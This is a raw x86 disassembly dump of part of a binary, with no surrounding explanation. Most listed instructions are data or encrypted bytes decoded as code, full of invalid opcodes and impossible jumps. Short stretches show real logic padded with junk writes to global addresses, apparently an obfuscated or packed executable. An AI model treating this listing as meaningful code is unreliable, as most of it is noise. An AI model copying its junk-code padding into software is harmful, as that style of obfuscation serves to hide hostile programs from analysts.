  4072a9:	lods   al,BYTE PTR ds:[esi]
  4072aa:	mov    ebp,DWORD PTR [ebx]
  4072ac:	adc    BYTE PTR [ebp+0x5b],dh
  4072af:	retf   
  4072b0:	fisubr WORD PTR [ebx+eax*8]
  4072b3:	call   FWORD PTR [ebx]
  4072b5:	outs   dx,BYTE PTR ds:[esi]
  4072b6:	jb     0x407311
  4072b8:	cmp    BYTE PTR [ecx-0x6976fad4],0x28
  4072bf:	add    esi,DWORD PTR [edi-0x4c]
  4072c2:	push   cs
  4072c3:	or     DWORD PTR [eax],edx
  4072c5:	sub    al,0xe
  4072c7:	daa    
  4072c8:	lds    edx,FWORD PTR [edi]
  4072ca:	je     0x407271
  4072cc:	cmp    eax,0x3c4f78a9
  4072d1:	sar    DWORD PTR [edi+0x356a128b],cl
  4072d7:	aas    
  4072d8:	jp     0x4072fb
  4072da:	in     al,dx
  4072db:	or     DWORD PTR [ebx],0xf9d85236
  4072e1:	xchg   edx,eax
  4072e2:	mov    DWORD PTR [esi],edi
  4072e4:	cmp    BYTE PTR [edx+0x40d1f01],0x30
  4072eb:	not    BYTE PTR [esi-0x34]
  4072ee:	pop    ss
  4072ef:	mov    dl,BYTE PTR [ebp-0xc]
  4072f2:	xchg   ebp,eax
  4072f3:	mov    bh,0x7d
  4072f5:	sar    BYTE PTR ds:[esi+0x3c988c55],cl
  4072fc:	push   cs
  4072fd:	pop    ecx
  4072fe:	or     esp,ebx
  407300:	shl    DWORD PTR [esi+0x65c511ac],1
  407306:	icebp  
  407307:	dec    edx
  407308:	pusha  
  407309:	sbb    al,0x4f
  40730b:	ret    0xc06e
  40730e:	push   ecx
  40730f:	mov    ah,0x27
  407311:	mov    ch,0x1c
  407313:	aas    
  407314:	jae    0x407394
  407316:	push   ecx
  407317:	mov    ecx,0x11ee0215
  40731c:	idiv   DWORD PTR [esi]
  40731e:	pop    ds
  40731f:	out    0xa9,al
  407321:	ret    
  407322:	or     al,0xe0
  407324:	gs sbb ch,ch
  407327:	test   eax,0x60f46db5
  40732c:	pop    esp
  40732d:	mov    ebp,0xdaac4495
  407332:	cmc    
  407333:	mov    eax,DWORD PTR [ecx-0x416456da]
  407339:	clc    
  40733a:	dec    DWORD PTR [ebx+0x1d]
  40733d:	adc    dl,dl
  40733f:	(bad)  
  407340:	cmp    BYTE PTR [ecx+0x27c1ad44],dl
  407346:	push   ebx
  407347:	mov    eax,DWORD PTR [ebp-0xc]
  40734a:	add    DWORD PTR ds:0x42fdd1,0x42e803
  407354:	xor    eax,esi
  407356:	add    DWORD PTR ds:0x42fdfd,0x57f6
  407360:	add    eax,edi
  407362:	xor    DWORD PTR ds:0x42e80f,0x2a11
  40736c:	mov    DWORD PTR [ebp-0x18],eax
  40736f:	mov    DWORD PTR [ebp-0x1c],0xf89c853c
  407376:	mov    BYTE PTR [ebp-0x1],0x67
  40737a:	and    DWORD PTR ds:0x42fdfd,0x0
  407384:	mov    eax,ds:0x42fdfd
  407389:	inc    eax
  40738a:	mov    ds:0x42fdfd,eax
  40738f:	cmp    DWORD PTR ds:0x42fdfd,0xe
  407396:	jne    0x4073a2
  40739c:	call   DWORD PTR ds:0x42e55f
  4073a2:	cmp    DWORD PTR ds:0x42fdfd,0xd
  4073a9:	jne    0x4073ba
  4073af:	mov    eax,ds:0x42fdfd
  4073b4:	inc    eax
  4073b5:	mov    ds:0x42fdfd,eax
  4073ba:	cmp    DWORD PTR ds:0x42fdfd,0x1d
  4073c1:	jb     0x407384
  4073c7:	mov    eax,DWORD PTR [ebp-0xc]
  4073ca:	xor    eax,esi
  4073cc:	and    DWORD PTR ds:0x42e228,0xdb
  4073d6:	add    eax,edi
  4073d8:	or     DWORD PTR ds:0x42e807,0x71a5
  4073e2:	mov    DWORD PTR [ebp-0x18],eax
  4073e5:	adc    eax,0x7137
  4073ea:	jmp    0x407737
  4073ef:	or     DWORD PTR ds:[edi],eax
  4073f2:	(bad)  
  4073f3:	rcl    edx,cl
  4073f5:	cmp    DWORD PTR [ecx],edx
  4073f7:	pop    ecx
  4073f8:	jns    0x4073c5
  4073fa:	popa   
  4073fb:	bnd jae 0x407413
  4073fe:	shl    edi,0xcf
  407401:	jo     0x407473
  407403:	and    BYTE PTR [ebp+0x70],bh
  407406:	jo     0x40747a
  407408:	mov    ds:0x33dd8cba,al
  40740d:	xlat   BYTE PTR ds:[ebx]
  40740e:	xchg   ebx,eax
  40740f:	add    edi,edi
  407411:	jmp    0xb0e69881
  407416:	test   BYTE PTR [esi+esi*8-0x53],dh
  40741a:	int3   
  40741b:	sub    ah,bh
  40741d:	xchg   ecx,eax
  40741e:	into   
  40741f:	scas   eax,DWORD PTR es:[edi]
  407420:	(bad)  
  407421:	mov    dl,0x96
  407423:	(bad)  [ebx+ebx*4+0xf]
  407427:	dec    eax
  407428:	data16 sbb bh,BYTE PTR [eax+0x6a]
  40742c:	pop    esi
  40742d:	mov    dl,0xff
  40742f:	jg     0x407478
  407431:	xchg   DWORD PTR [esp+edi*8+0x49],edx
  407435:	and    ecx,DWORD PTR [edx-0x71]
  407438:	arpl   WORD PTR [ecx-0x618051e1],bx
  40743e:	out    0x3a,al
  407440:	xchg   ebx,eax
  407441:	sti    
  407442:	in     al,0x85
  407444:	lock cmp BYTE PTR [ebx+eax*1+0x15],ah
  407449:	aad    0x80
  40744b:	or     edi,ecx
  40744d:	xchg   esi,eax
  40744e:	les    esp,FWORD PTR [edi+esi*8-0x7f]
  407452:	adc    eax,0x316f110b
  407457:	cli    
  407458:	jp     0x407498
  40745a:	cdq    
  40745b:	mov    cl,0x87
  40745d:	fwait
  40745e:	sub    esi,DWORD PTR [eax+0x2c]
  407461:	clc    
  407462:	xor    cl,BYTE PTR [ebx+0x9b26406]
  407468:	or     BYTE PTR [edi+0x61c2eb95],ah
  40746e:	add    dh,BYTE PTR [edi+0x2f]
  407471:	out    dx,eax
  407472:	jo     0x40746a
  407474:	sar    DWORD PTR [ecx-0x393cc8ee],0xcb
  40747b:	mov    ebp,0x59ddef0d
  407480:	shl    ecx,0x97
  407483:	jle    0x407494
  407485:	lock es pop edx
  407488:	pop    es
  407489:	das    
  40748a:	retf   0x754
  40748d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40748e:	xchg   esp,eax
  40748f:	(bad)  
  407490:	jae    0x40743e
  407492:	or     eax,0xd23ba5f0
  407497:	dec    esp
  407498:	into   
  407499:	fcomp  DWORD PTR [esi+0x12]
  40749c:	mov    ah,0x6a
  40749e:	dec    edx
  40749f:	inc    ecx
  4074a0:	les    ebp,FWORD PTR [edx-0x7700f9b4]
  4074a6:	ins    DWORD PTR es:[edi],dx
  4074a7:	(bad)  
  4074a8:	mov    dh,0x26
  4074aa:	or     esi,DWORD PTR [eax-0x73f441c0]
  4074b0:	mov    eax,0xa9271d21
  4074b5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4074b6:	xchg   DWORD PTR [ebp+0x67],ebx
  4074b9:	mov    bl,0x4b
  4074bb:	push   esi
  4074bc:	cmp    al,0x65
  4074be:	xchg   esp,eax
  4074bf:	ss data16 mov bl,0xcf
  4074c3:	cld    
  4074c4:	sub    BYTE PTR [ebx+0x518529a3],al
  4074ca:	into   
  4074cb:	lock cmp ebp,edx
  4074ce:	rcr    ah,cl
  4074d0:	jle    0x4074b5
  4074d2:	push   eax
  4074d3:	mov    edi,0xe0933bae
  4074d8:	and    al,0x16
  4074da:	dec    esi
  4074db:	jg     0x40754e
  4074dd:	mov    eax,ds:0x604bb134
  4074e2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4074e3:	ja     0x407526
  4074e5:	add    DWORD PTR [edx-0x26],0x7f891fc
  4074ec:	mov    bl,0x27
  4074ee:	jae    0x40748e
  4074f0:	xchg   DWORD PTR [ecx],esi
  4074f2:	stos   BYTE PTR es:[edi],al
  4074f3:	jp     0x407504
  4074f5:	pop    es
  4074f6:	xchg   ecx,eax
  4074f7:	pop    edx
  4074f8:	sub    ebx,DWORD PTR [eax+0x2aa2b947]
  4074fe:	je     0x4074cd
  407500:	fdiv   QWORD PTR [ecx-0x7a]
  407503:	push   esi
  407504:	loop   0x40757f
  407506:	scas   eax,DWORD PTR es:[edi]
  407507:	or     ecx,0xffffffbf
  40750a:	js     0x407499
  40750c:	mov    bh,dh
  40750e:	jbe    0x4074ad
  407510:	pushw  cs
  407512:	add    ebp,0x65903545
  407518:	cdq    
  407519:	xchg   edi,eax
  40751a:	mov    ah,0x55
  40751c:	shl    DWORD PTR [ebx+0x4],0x82
  407520:	(bad)  
  407521:	aad    0x5a
  407523:	js     0x407554
  407525:	xor    BYTE PTR [edi+0x3e],0x8d
  407529:	mov    BYTE PTR [ebx-0x2f],bh
  40752c:	shl    dh,0x85
  40752f:	das    
  407530:	adc    edx,ebp
  407532:	arpl   WORD PTR [eax],cx
  407534:	imul   eax,DWORD PTR [ebx+eax*2],0xffffff9f
  407538:	jge    0x407543
  40753a:	cmp    al,0x9b
  40753c:	xchg   edi,eax
  40753d:	xchg   edi,eax
  40753e:	mov    WORD PTR [edx+edx*8+0x57069bc5],?
  407545:	cmp    dl,BYTE PTR [eax+0x37904a12]
  40754b:	pop    ds
  40754c:	push   ds
  40754d:	mov    bl,0x42
  40754f:	push   0x92076d7d
  407554:	add    al,0x90
  407556:	enter  0x4cfc,0xcf
  40755a:	bound  eax,QWORD PTR [edi+edx*2]
  40755d:	sub    eax,eax
  40755f:	sub    DWORD PTR [eax+0x5e],0x61
  407563:	adc    DWORD PTR [ecx+edx*2],edx
  407566:	cld    
  407567:	gs frndint 
  40756a:	add    DWORD PTR [ecx],0x42
  40756d:	push   ds
  40756e:	mov    dl,0xa8
  407570:	or     DWORD PTR [edi+0x75],0x67
  407574:	stos   BYTE PTR es:[edi],al
  407575:	pop    ebp
  407576:	jecxz  0x4074f9
  407578:	inc    ebp
  407579:	add    DWORD PTR [eax-0x10],0x71
  40757d:	(bad)  
  40757e:	or     bl,cl
  407580:	adc    eax,0xde455403
  407585:	jae    0x407533
  407587:	jg     0x4075ae
  407589:	stos   DWORD PTR es:[edi],eax
  40758a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40758b:	xchg   ecx,eax
  40758c:	cs pop esp
  40758e:	dec    ebp
  40758f:	dec    edi
  407590:	retf   
  407591:	inc    ecx
  407592:	retf   
  407593:	retf   
  407594:	in     eax,0x0
  407596:	xchg   ecx,eax
  407597:	and    ah,al
  407599:	push   eax
  40759a:	ss fs push cs
  40759d:	retf   
  40759e:	fwait
  40759f:	int    0xfb
  4075a1:	bound  esp,QWORD PTR [edx+0xb]
  4075a4:	rcr    DWORD PTR [eax+edx*8-0x11],1
  4075a8:	shl    bh,cl
  4075aa:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4075ab:	jmp    0xeaf21922
  4075b0:	sbb    eax,edi
  4075b2:	out    0x22,eax
  4075b4:	das    
  4075b5:	std    
  4075b6:	add    BYTE PTR [esi-0x6508a72],ch
  4075bc:	lods   eax,DWORD PTR ds:[esi]
  4075bd:	pushf  
  4075be:	nop
  4075bf:	pop    edx
  4075c0:	(bad)  
  4075c2:	sbb    dl,cl
  4075c4:	sbb    BYTE PTR [ebx],ch
  4075c6:	mov    dh,0xcc
  4075c8:	sbb    dl,BYTE PTR [ebp+0x7c]
  4075cb:	push   es
  4075cc:	and    DWORD PTR [ebx],edx
  4075ce:	jo     0x407622
  4075d0:	and    al,0xa3
  4075d2:	xor    eax,0xa9de72c3
  4075d7:	loope  0x4075bd
  4075d9:	mov    bh,0x63
  4075db:	mov    ds:0x47bdd28,eax
  4075e0:	ins    BYTE PTR es:[edi],dx
  4075e1:	mov    DWORD PTR [ecx],ebp
  4075e3:	arpl   WORD PTR [esi-0x3b],bx
  4075e6:	xor    esp,esi
  4075e8:	jle    0x40756a
  4075ea:	mov    ecx,0x949f05bf
  4075ef:	adc    BYTE PTR [ebx],cl
  4075f1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4075f2:	int    0xe8
  4075f4:	cmp    BYTE PTR [esi+0x5ea6be0a],bl
  4075fa:	mov    ch,0x86
  4075fc:	adc    eax,0xde9955a7
  407601:	push   eax
  407602:	dec    ebp
  407603:	aad    0x62
  407605:	add    al,BYTE PTR [eax-0x5f15f23a]
  40760b:	(bad)  
  40760c:	push   eax
  40760d:	fild   WORD PTR [eax+ebp*8]
  407610:	mov    ebx,edi
  407612:	inc    esi
  407613:	in     al,dx
  407614:	(bad)  [esi]
  407616:	fimul  DWORD PTR [ecx]
  407618:	pop    esp
  407619:	add    BYTE PTR [edi+eax*1],cl
  40761c:	mov    DWORD PTR [eax+0x46],edi
  40761f:	xchg   edx,eax
  407620:	cli    
  407621:	jp     0x407659
  407623:	ins    BYTE PTR es:[edi],dx
  407624:	imul   ecx,DWORD PTR [edi+ebp*8+0x5e02de69],0x88f8ecdc
  40762f:	je     0x40760f
  407631:	outs   dx,BYTE PTR ds:[esi]
  407632:	xchg   ebx,eax
  407633:	inc    eax
  407634:	imul   ebx,DWORD PTR [edi-0x693d591a],0xe2e362b4
  40763e:	sub    al,0x31
  407640:	pop    edx
  407641:	mov    al,0x7e
  407643:	out    dx,al
  407644:	push   esp
  407645:	dec    esi
  407646:	imul   BYTE PTR [ebx-0x26852d71]
  40764c:	icebp  
  40764d:	and    eax,0x706dea54
  407652:	pop    esp
  407653:	mov    ch,0xf4
  407655:	cmc    
  407656:	and    al,0xdf
  407658:	mov    bl,0xb0
  40765a:	push   ecx
  40765b:	and    bh,al
  40765d:	pop    cx
  40765f:	inc    ebx
  407660:	clc    
  407661:	or     al,0xc1
  407663:	cwde   
  407664:	or     dh,BYTE PTR [edi-0x7b97fcd2]
  40766a:	psubusw mm2,QWORD PTR [edi-0x2aeb8b31]
  407671:	outs   dx,BYTE PTR ds:[esi]
  407672:	xchg   ebp,eax
  407673:	pop    esi
  407674:	push   ds
  407675:	pusha  
  407676:	mov    BYTE PTR [ecx+0x334b732c],dl
  40767c:	lods   eax,DWORD PTR ds:[esi]
  40767d:	imul   ebp,DWORD PTR [esi-0x1600603a],0x31a77745
  407687:	test   edx,0x3f15f38c
  40768d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40768e:	mov    ecx,0x7e28bd61
  407693:	mov    BYTE PTR [edx],bh
  407695:	lahf   
  407696:	fwait
  407697:	out    0xa1,al
  407699:	pop    ebp
  40769a:	fild   QWORD PTR [ebp+0x191724ef]
  4076a0:	repnz stc 
  4076a2:	jnp    0x40771f
  4076a4:	neg    BYTE PTR [ecx-0x42838d66]
  4076aa:	add    esp,DWORD PTR [ebp-0x58]
  4076ad:	lock xor DWORD PTR [ebx-0x79675107],0x43
  4076b5:	cdq    
  4076b6:	and    DWORD PTR [eax],ebp
  4076b8:	stos   DWORD PTR es:[edi],eax
  4076b9:	add    al,BYTE PTR [edx-0x9]
  4076bc:	shl    BYTE PTR [esi],cl
  4076be:	fs mov al,0xc8
  4076c1:	sbb    bh,BYTE PTR [ebx+0x22]
  4076c4:	scas   eax,DWORD PTR es:[edi]
  4076c5:	add    BYTE PTR [eax+0x6806962b],bh
  4076cb:	ror    BYTE PTR [ecx],cl
  4076cd:	adc    al,0xc4
  4076cf:	mov    al,ds:0x8ac359a5
  4076d4:	cmp    al,dh
  4076d6:	sub    al,BYTE PTR [esi+0x62]
  4076d9:	jae    0x40772d
  4076db:	fdivrp st(6),st
  4076dd:	mov    edi,DWORD PTR [ebp+0x23]
  4076e0:	jecxz  0x407758
  4076e2:	sub    BYTE PTR [ecx+eiz*1+0x60],dl
  4076e6:	int3   
  4076e7:	fmul   st(4),st
  4076e9:	cwde   
  4076ea:	unpcklps xmm0,XMMWORD PTR [ecx+0x25e96f26]
  4076f1:	jle    0x4076ae
  4076f3:	idiv   BYTE PTR [edi-0x301ed2e4]
  4076f9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4076fa:	(bad)  
  4076fb:	sub    ebx,DWORD PTR [esp+ebp*1+0x56]
  4076ff:	sahf   
  407700:	sbb    eax,0x8cb65f35
  407705:	xchg   edi,eax
  407706:	in     al,0xbc
  407708:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407709:	inc    edi
  40770a:	ss push edi
  40770c:	add    BYTE PTR [esi+eax*1+0x30d63c66],0x2f
  407714:	in     eax,0x4d
  407716:	mov    ah,dh
  407718:	and    al,ah
  40771a:	jo     0x40778c
  40771c:	int    0x90
  40771e:	mov    cl,0x1f
  407720:	ins    BYTE PTR es:[edi],dx
  407721:	inc    ebp
  407722:	mov    edx,0xccae821f
  407727:	inc    ebp
  407728:	mov    DWORD PTR [edx],0xfada7adb
  40772e:	cld    
  40772f:	add    al,0x15
  407731:	js     0x4076f3
  407733:	mov    ecx,0x8bad30e8
  407738:	inc    ebp
  407739:	fdiv   QWORD PTR [ebx]
  40773b:	mov    BYTE PTR [ebx],0xc7
  40773e:	adc    DWORD PTR ds:0x42e21c,0x42fe09
  407748:	push   eax
  407749:	inc    eax
  40774a:	mov    eax,DWORD PTR [ebp-0x28]
  40774d:	sbb    DWORD PTR ds:0x42fdd1,0x6777
  407757:	xor    eax,esi
  407759:	add    eax,edi
  40775b:	push   eax
  40775c:	mov    eax,DWORD PTR [ebp-0x1c]
  40775f:	or     DWORD PTR ds:0x42e7ef,0x4a3f
  407769:	xor    eax,esi
  40776b:	add    DWORD PTR ds:0x42fdf1,0x266c
  407775:	add    eax,edi
  407777:	xor    DWORD PTR ds:0x42e80f,0x42e7eb
  407781:	push   eax
  407782:	lea    eax,[ebp-0x78]
  407785:	push   eax
  407786:	add    DWORD PTR ds:0x42e7ff,0x5eb6
  407790:	push   DWORD PTR [ebp-0xc]
  407793:	adc    DWORD PTR ds:0x42e803,0x2bbb
  40779d:	push   DWORD PTR [ebp-0x14]
  4077a0:	call   0x405e60
  4077a5:	adc    DWORD PTR ds:0x42fde5,0x42fe6e
  4077af:	test   eax,eax
  4077b1:	je     0x407e83
  4077b7:	lea    eax,[ebp-0x78]
  4077ba:	sbb    DWORD PTR ds:0x42fe82,0x6660
  4077c4:	push   eax
  4077c5:	mov    eax,DWORD PTR [ebp-0x14]
  4077c8:	jmp    0x407b15
  4077cd:	xlat   BYTE PTR ds:[ebx]
  4077ce:	and    BYTE PTR [eax+eiz*8+0x73],ch
  4077d2:	ins    BYTE PTR es:[edi],dx
  4077d3:	push   ebx
  4077d4:	aaa    
  4077d5:	pop    edx
  4077d6:	push   ecx
  4077d7:	push   ebx
  4077d8:	sahf   
  4077d9:	sbb    al,0x55
  4077db:	jp     0x4077cb
  4077dd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4077de:	int3   
  4077df:	jo     0x407851
  4077e1:	and    BYTE PTR [ebp+0x70],bh
  4077e4:	jo     0x40784b
  4077e6:	add    DWORD PTR [ecx],edi
  4077e8:	xchg   ebx,eax
  4077e9:	mov    ebx,0x6105c8af
  4077ee:	jo     0x4077e3
  4077f0:	lahf   
  4077f1:	lods   eax,DWORD PTR ds:[esi]
  4077f2:	int3   
  4077f3:	jp     0x407794
  4077f5:	(bad)  
  4077f6:	xlat   BYTE PTR ds:[ebx]
  4077f7:	jmp    0xd88b:0xd440bbf8
  4077fe:	sbb    dh,BYTE PTR [esi-0xc]
  407801:	addr16 push ebx
  407803:	and    al,0x9e
  407805:	and    ebp,DWORD PTR ds:0xcc6b5828
  40780b:	fidiv  DWORD PTR [esi+0x67faba2e]
  407811:	fcmovbe st,st(5)
  407813:	int    0x1d
  407815:	adc    DWORD PTR [ecx-0x2e971f0f],edx
  40781b:	out    0xb5,eax
  40781d:	int    0x19
  40781f:	mov    dl,0x6c
  407821:	mov    dh,0xce
  407823:	xor    al,0x98
  407825:	shl    BYTE PTR [ecx],1
  407827:	push   edx
  407828:	loop   0x407874
  40782a:	mov    esp,0xd8a651c1
  40782f:	xchg   ebx,eax
  407830:	and    al,0x63
  407832:	jns    0x4077ca
  407834:	dec    ecx
  407835:	push   edi
  407836:	sbb    WORD PTR [esi-0x72],bx
  40783a:	and    edi,ecx
  40783c:	pushf  
  40783d:	mov    bh,0x84
  40783f:	add    dh,BYTE PTR [ebx-0x3f]
  407842:	imul   esi,DWORD PTR [ecx],0xffffffd0
  407845:	push   ebx
  407846:	or     BYTE PTR [esi],bl
  407848:	mov    ds:0xf6b1807c,al
  40784d:	cmc    
  40784e:	sbb    al,0x63
  407850:	neg    BYTE PTR [esp+ecx*8]
  407853:	jl     0x407864
  407855:	add    BYTE PTR [ebx],cl
  407857:	sub    eax,0x941b021b
  40785c:	adc    al,al
  40785e:	cdq    
  40785f:	(bad)  
  407860:	pop    ebx
  407861:	and    ch,BYTE PTR [esp+0x22]
  407865:	adc    eax,0x795c99b7
  40786a:	daa    
  40786b:	xor    al,0x22
  40786d:	mov    ebp,0xaa79073c
  407872:	jae    0x4078a7
  407874:	push   0x2b
  407876:	sub    bh,BYTE PTR [edi-0x8]
  407879:	xchg   esi,eax
  40787a:	sbb    eax,0x34752d6d
  40787f:	mov    ebp,0x12869086
  407884:	and    DWORD PTR [esi],0x3f
  407887:	ja     0x4078cf
  407889:	adc    ebx,ecx
  40788b:	push   ds
  40788c:	xchg   esi,eax
  40788d:	int3   
  40788e:	shl    BYTE PTR [eax],0x62
  407891:	push   cs
  407892:	xor    ch,BYTE PTR [edi]
  407894:	imul   eax,eax,0xffffffd0
  407897:	push   es
  407898:	cli    
  407899:	dec    ecx
  40789a:	push   ebx
  40789b:	pop    ecx
  40789c:	xchg   esp,eax
  40789d:	clc    
  40789e:	push   edi
  40789f:	(bad)  
  4078a0:	in     eax,0x16
  4078a2:	rcr    DWORD PTR [edi-0x6a6d8329],cl
  4078a8:	add    al,0xfa
  4078aa:	push   edi
  4078ab:	shl    bl,0xaf
  4078ae:	out    0xe2,eax
  4078b0:	test   dh,0xd
  4078b3:	popf   
  4078b4:	adc    eax,0x9c7964fa
  4078b9:	xchg   edx,eax
  4078ba:	mov    DWORD PTR [ebx+0x6],esi
  4078bd:	fcom   QWORD PTR [ecx+edx*4-0x3fffc72a]
  4078c4:	mov    eax,esi
  4078c6:	jae    0x4078b0
  4078c8:	retf   
  4078c9:	push   0xffffff84
  4078cb:	sti    
  4078cc:	mov    fs,WORD PTR [ebp+0x31e52d3c]
  4078d2:	leave  
  4078d3:	hlt    
  4078d4:	push   esp
  4078d5:	cdq    
  4078d6:	repnz scas eax,DWORD PTR es:[edi]
  4078d8:	scas   eax,DWORD PTR es:[edi]
  4078d9:	fimul  DWORD PTR [edx+0x16]
  4078dc:	(bad)  
  4078dd:	mov    al,0xaa
  4078df:	push   esp
  4078e0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4078e1:	push   esp
  4078e2:	cmc    
  4078e3:	in     eax,0xcf
  4078e5:	add    eax,0x80747e92
  4078ea:	idiv   BYTE PTR [edx+0x2af036fc]
  4078f0:	inc    esp
  4078f1:	mov    ecx,0x8c9da61c
  4078f6:	xor    al,0x5c
  4078f8:	xor    al,BYTE PTR [edi]
  4078fa:	mov    eax,ds:0xa389cfdb
  4078ff:	out    0x32,al
  407901:	outs   dx,DWORD PTR ds:[esi]
  407902:	mov    bl,0xd4
  407904:	fmul   st(5),st
  407906:	dec    BYTE PTR ds:0x81f7f06d
  40790c:	jle    0x407932
  40790e:	mul    BYTE PTR [ecx+0x792c4a51]
  407914:	mov    al,0xd2
  407916:	xchg   ebp,edx
  407918:	retf   
  407919:	xchg   esp,eax
  40791a:	fwait
  40791b:	or     BYTE PTR [edi],ch
  40791d:	mov    bh,0x53
  40791f:	icebp  
  407920:	add    BYTE PTR [esi+0x55efd8ce],al
  407926:	push   edx
  407927:	sub    eax,0xd58addae
  40792c:	jge    0x40798a
  40792e:	mov    ebp,0x170625ad
  407933:	mov    ch,0xce
  407935:	ficom  WORD PTR [ecx+0x122a0a3c]
  40793b:	or     ebp,esp
  40793d:	push   cs
  40793e:	fwait
  40793f:	nop
  407940:	fimul  DWORD PTR [esi+0x777df69f]
  407946:	cmp    DWORD PTR [esi+0x54],ebp
  407949:	retf   0x228
  40794c:	popa   
  40794d:	jnp    0x4078e2
  40794f:	aaa    
  407950:	sub    bh,BYTE PTR [eax]
  407952:	mov    esi,0x573f1bbb
  407957:	pop    es
  407958:	fisttp DWORD PTR [edx+0x1d]
  40795b:	jno    0x4079b6
  40795d:	sbb    BYTE PTR [edi+0x134f6f94],0xd3
  407964:	xchg   edi,eax
  407965:	mov    ds:0x6b533360,eax
  40796a:	fs dec esi
  40796c:	fcomp  DWORD PTR [esi+0x11]
  40796f:	pop    edx
  407970:	mov    bl,BYTE PTR [eax+0x1610ee7f]
  407976:	retf   
  407977:	shr    BYTE PTR [edx-0x7bd05e4d],1
  40797d:	pop    edx
  40797e:	xor    DWORD PTR [ebp-0x2d],ecx
  407981:	div    DWORD PTR [eax+0x40]
  407984:	add    eax,0x90cb42a9
  407989:	push   esi
  40798a:	add    eax,0x85b6ea29
  40798f:	ins    DWORD PTR es:[edi],dx
  407990:	arpl   WORD PTR [ebp-0x2f1876a7],dx
  407996:	mov    ds:0xced6e213,eax
  40799b:	les    esi,FWORD PTR [eax]
  40799d:	fidiv  WORD PTR [esi]
  40799f:	mov    al,0xca
  4079a1:	jmp    0x9fa73b3b
  4079a6:	arpl   WORD PTR [ebx],bx
  4079a8:	mov    ecx,0x12695dc8
  4079ad:	ret    0x7989
  4079b0:	shr    eax,cl
  4079b2:	xor    BYTE PTR [ebp-0x203fd5a7],bl
  4079b8:	call   0x48d546a4
  4079bd:	outs   dx,BYTE PTR ds:[esi]
  4079be:	dec    ebx
  4079bf:	pop    ss
  4079c0:	leave  
  4079c1:	xchg   esi,eax
  4079c2:	out    0xe5,al
  4079c4:	sbb    ch,dl
  4079c6:	adc    esp,DWORD PTR [edi+0x62]
  4079c9:	mov    dl,0x78
  4079cb:	sbb    dh,BYTE PTR [ebp-0x5182f30b]
  4079d1:	aaa    
  4079d2:	mov    al,0x5f
  4079d4:	outs   dx,BYTE PTR ds:[esi]
  4079d5:	std    
  4079d6:	fild   WORD PTR [ebx]
  4079d8:	lock push edx
  4079da:	pop    es
  4079db:	cmp    edx,DWORD PTR [esp+edx*4+0x1fb4277c]
  4079e2:	xbegin 0x1a49b7f3
  4079e8:	push   ebp
  4079e9:	into   
  4079ea:	loope  0x407978
  4079ec:	in     eax,dx
  4079ed:	mov    al,0x6c
  4079ef:	out    dx,eax
  4079f0:	cmp    BYTE PTR [edi],al
  4079f2:	xor    DWORD PTR [edi+0x3b5b97fd],ebx
  4079f8:	xor    dl,BYTE PTR [edx+esi*4]
  4079fb:	ins    BYTE PTR es:[edi],dx
  4079fc:	pop    ebp
  4079fd:	stos   DWORD PTR es:[edi],eax
  4079fe:	mov    bl,0x15
  407a00:	or     bl,BYTE PTR [esi]
  407a02:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407a03:	sub    BYTE PTR [esi+eax*8+0x36],bh
  407a07:	ficom  WORD PTR [ebx+0x21c985b5]
  407a0d:	inc    ebp
  407a0e:	pusha  
  407a0f:	inc    esi
  407a10:	inc    esi
  407a11:	out    dx,al
  407a12:	out    dx,eax
  407a13:	jb     0x4079f3
  407a15:	call   0x5e33:0x2be60927
  407a1c:	mov    esi,0xd5479702
  407a21:	test   esi,ebp
  407a23:	push   edi
  407a24:	std    
  407a25:	int    0x21
  407a27:	loop   0x4079cb
  407a29:	cli    
  407a2a:	lahf   
  407a2b:	cmp    al,0x43
  407a2d:	enter  0xb74f,0xc0
  407a31:	or     DWORD PTR [ecx+0x46],0xe4d6f965
  407a38:	push   0x46
  407a3a:	push   esi
  407a3b:	stos   DWORD PTR es:[edi],eax
  407a3c:	jns    0x407a1d
  407a3e:	push   eax
  407a3f:	retf   
  407a40:	hlt    
  407a41:	outs   dx,DWORD PTR ds:[esi]
  407a42:	in     al,0x77
  407a44:	idiv   DWORD PTR [eax]
  407a46:	inc    esp
  407a47:	xchg   ebp,eax
  407a48:	mov    ds:0x6f59ae2a,eax
  407a4d:	push   es
  407a4e:	cwde   
  407a4f:	shr    DWORD PTR [esi+esi*1-0x8],cl
  407a53:	xchg   ebx,eax
  407a54:	pop    ebp
  407a55:	xor    eax,0xd748de16
  407a5a:	mov    ecx,0x8f4efbbd
  407a5f:	push   es
  407a60:	mov    bh,0x2
  407a62:	lahf   
  407a63:	out    0x4a,eax
  407a65:	lahf   
  407a66:	aam    0x99
  407a68:	xor    bh,0xa9
  407a6b:	outs   dx,BYTE PTR ds:[esi]
  407a6c:	pop    ecx
  407a6d:	dec    edx
  407a6e:	sub    cl,BYTE PTR [edi]
  407a70:	cdq    
  407a71:	test   BYTE PTR [edi+edi*1-0x1d09c097],0xad
  407a79:	rol    ebx,1
  407a7b:	les    eax,FWORD PTR [ecx]
  407a7d:	(bad)
  407a80:	pop    ebp
  407a81:	cmp    edx,DWORD PTR [ecx+eax*4+0x7a]
  407a85:	dec    ebp
  407a86:	xchg   ebx,eax
  407a87:	loopne 0x407aa1
  407a89:	stc    
  407a8a:	pop    es
  407a8b:	les    edi,FWORD PTR [ecx]
  407a8d:	daa    
  407a8e:	loopne 0x407a5f
  407a90:	mov    ecx,0xb6e88846
  407a95:	jne    0x407a66
  407a97:	call   0xa801a46f
  407a9c:	push   ecx
  407a9d:	mov    ?,WORD PTR [ebx+0x54]
  407aa0:	imul   ebp,DWORD PTR [edi],0x68
  407aa3:	fdiv   st,st(2)
  407aa5:	xor    al,0xef
  407aa7:	push   es
  407aa8:	jb     0x407a30
  407aaa:	enter  0xe851,0x7f
  407aae:	mov    ebp,0x35475a05
  407ab3:	test   al,0x3c
  407ab5:	idiv   bh
